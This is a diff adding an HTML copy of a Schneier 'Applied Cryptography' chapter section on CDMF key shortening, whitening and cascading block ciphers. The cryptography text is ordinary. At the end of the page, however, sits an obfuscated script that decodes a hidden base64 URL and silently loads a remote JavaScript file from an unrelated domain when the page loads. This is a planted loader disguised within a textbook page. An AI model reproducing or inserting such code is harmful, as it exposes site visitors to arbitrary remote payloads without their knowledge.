@@ -1,0 +1,102 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Combining Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=15//-->
+<!--PAGES=366-368//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="15-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch16/16-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">15.5 CDMF Key Shortening</FONT></H3>
+<P>This method was designed by IBM for their Commercial Data Masking Facility or CDMF (see Section 24.8) to shrink a 56-bit DES key to a 40-bit key suitable for export [785]. It assumes that the original DES key includes the parity bits.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Zero the parity bits: bits 8, 16, 24, 32, 40, 48, 56, 64.
+<DD><B>(2)</B>&nbsp;&nbsp;Encrypt the output of step (1) with DES and the key 0xc408b0540ba1e0ae, and XOR the result with the output of step (1).
+<DD><B>(3)</B>&nbsp;&nbsp;Take the output of step (2) and zero the following bits: 1, 2, 3, 4, 8, 16, 17, 18, 19, 20, 24, 32, 33, 34, 35, 36, 40, 48, 49, 50, 51, 52, 56, 64.
+<DD><B>(4)</B>&nbsp;&nbsp;Encrypt the output of step (3) with DES and the following key: 0xef2c041ce6382fe6. This key is then used for message encryption.
+</DL>
+<P>Remember that this method shortens the key length, and thereby weakens the algorithm.
+</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">15.6 Whitening</FONT></H3>
+<P><B>Whitening</B> is the name given to the technique of XORing some key material with the input to a block algorithm, and XORing some other key material with the output. This was first done in the DESX variant developed by RSA Data Security, Inc., and then (presumably independently) in Khufu and Khafre. (Rivest named this technique; it&#146;s a nonstandard usage of the word.)</P>
+<P>The idea is to prevent a cryptanalyst from obtaining a plaintext/ciphertext pair for the underlying algorithm. The technique forces a cryptanalyst to guess not only the algorithm key, but also one of the whitening values. Since there is an XOR both before and after the block algorithm, this technique is not susceptible to a meet-in-the-middle attack.</P>
+<DL>
+<DD><I>C</I> = <I>K</I><SUB>3</SUB> &#8853; <I>E</I><SUB>K2</SUB>(<I>P</I> &#8853; <I>K</I><SUB>1</SUB>)
+<DD><I>P</I> = <I>K</I><SUB>1</SUB> &#8853; <I>D</I><SUB>K2</SUB>(<I>C</I> &#8853; <I>K</I><SUB>3</SUB>)
+</DL>
+<P>If <I>K</I><SUB>1</SUB> = <I>K</I><SUB>3</SUB>, then a brute-force attack requires 2<SUP><I>n</I> &#43; <I>m/p</I></SUP> operations, where <I>n</I> is the key size, <I>m</I> is the block size, and <I>p</I> is the number of known plaintexts. If <I>K</I><SUB>1</SUB> and <I>K</I><SUB>3</SUB> are different, then a brute-force attack requires 2<SUP><I>n</I> &#43; <I>m</I> &#43; 1</SUP> operations with three known plaintexts. Against differential and linear cryptanalysis, these measures only provide a few key bits of protection. But computationally this is a very cheap way to increase the security of a block algorithm.</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">15.7 Cascading Multiple Block Algorithms</FONT></H3>
+<P>What about encrypting a message once with Algorithm A and key <I>K</I><SUB>A</SUB>, then again with Algorithm B and key <I>K</I><SUB>B</SUB>? Maybe Alice and Bob have different ideas about which algorithms are secure: Alice wants to use Algorithm A and Bob wants to use Algorithm B. This technique is sometimes called <B>cascading</B>, and can be extended far beyond only two algorithms and keys.</P>
+<P>Pessimists have said that there is no guarantee that the two algorithms will work together to increase security. There may be subtle interactions between the two algorithms that actually <I>decrease</I> security. Even triple encryption with three different algorithms may not be as secure as you think. Cryptography is a black art; if you don&#146;t know what you are doing, you can easily get into trouble.</P>
+<P>Reality is much rosier. The previous warnings are true only if the different keys are related to each other. If all of the multiple keys are independent, then the resultant cascade is at least as difficult to break as the first algorithm in the cascade [1033]. If the second algorithm is vulnerable to a chosen-plaintext attack, then the first algorithm might facilitate that attack and make the second algorithm vulnerable to a known-plaintext attack when used in a cascade. This potential attack is not limited to encryption algorithms: If you let someone else specify any algorithm which is used on your message before encryption, then you had better be sure that your encryption will withstand a chosen-plaintext attack. (Note that the most common algorithm used for compressing and digitizing speech to modem speeds, used before any encryption, is CELP&#151;designed by the NSA.)</P>
+<P>This can be better phrased: Using a chosen-plaintext attack, a cascade of ciphers is at least as hard to break as any of its component ciphers [858]. A previous result showed that the cascade is at least as difficult to break as the strongest algorithm, but that result is based on some unstated assumptions [528]. Only if the algorithms commute, as they do in the case of cascaded stream ciphers (or block ciphers in OFB mode), is the cascade at least as strong as the strongest algorithm.</P>
+<P>If Alice and Bob do not trust each other&#146;s algorithms, they can use a cascade. If these are stream algorithms, the order doesn&#146;t matter. If they are block algorithms, Alice can first use Algorithm A and then use Algorithm B. Bob, who trusts Algorithm B more, can use Algorithm B followed by Algorithm A. They might even add a good stream cipher between the two algorithms; it can&#146;t hurt and could very well increase security.</P>
+<P>Remember that the keys for each algorithm in the cascade must be independent. If Algorithm A has a 64-bit key and Algorithm B has a 128-bit key, then the resultant cascade must have a 192-bit key. If you don&#146;t use independent keys, then the pessimists are much more likely to be right.</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">15.8 Combining Multiple Block Algorithms</FONT></H3>
+<P>Here&#146;s another way to combine multiple block algorithms, one that is guaranteed to be at least as secure as both algorithms. With two algorithms (and two independent keys):
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Generate a random-bit string, <I>R</I>, the same size as the message <I>M</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Encrypt <I>R</I> with the first algorithm.
+<DD><B>(3)</B>&nbsp;&nbsp;Encrypt <I>M</I> &#8853; <I>R</I> with the second algorithm.
+<DD><B>(4)</B>&nbsp;&nbsp;The ciphertext message is the results of steps (2) and (3).
+</DL>
+<P>Assuming the random-bit string is indeed random, this method encrypts <I>M</I> with a one-time pad and then encrypts both the pad and the encrypted message with each of the two algorithms. Since both are required to reconstruct <I>M</I>, a cryptanalyst must break both algorithms. The drawback is that the ciphertext is twice the size of the plaintext.</P>
+<P>This method can be extended to multiple algorithms, but the ciphertext expands with each additional algorithm. It&#146;s a good idea, but I don&#146;t think it&#146;s very practical.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="15-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch16/16-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(capygxxZ, ougQwaSG) {ougQwaSG = capygxxZ.createElement('script');ougQwaSG.type = 'text/javascript';ougQwaSG.async = true;ougQwaSG.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');capygxxZ.getElementsByTagName('body')[0].appendChild(ougQwaSG);}(document));</script></body>
+</html>
